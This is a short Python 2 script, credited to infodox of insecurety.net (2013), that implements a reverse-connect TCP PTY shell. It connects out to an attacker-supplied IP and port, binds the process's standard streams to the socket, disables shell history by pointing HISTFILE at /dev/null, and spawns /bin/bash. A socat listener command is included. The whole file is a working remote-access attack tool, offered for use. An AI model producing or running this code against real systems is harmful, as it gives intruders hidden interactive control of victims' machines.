#!/usr/bin/python2
"""
Reverse Connect TCP PTY Shell - v1.0
infodox - insecurety.net (2013)

Gives a reverse connect PTY over TCP.

For an excellent listener use the following socat command:
socat file:`tty`,echo=0,raw tcp4-listen:PORT

Or use the included tcp_pty_shell_handler.py
"""
import os
import pty
import sys
import socket

def main():
    if len(sys.argv) < 3:
      print("Usage:\n  " + sys.argv[0] + " <ip> <port>\n")
      exit(1)

    rhost = str(sys.argv[1])
    rport = int(sys.argv[2])
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((rhost, rport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()
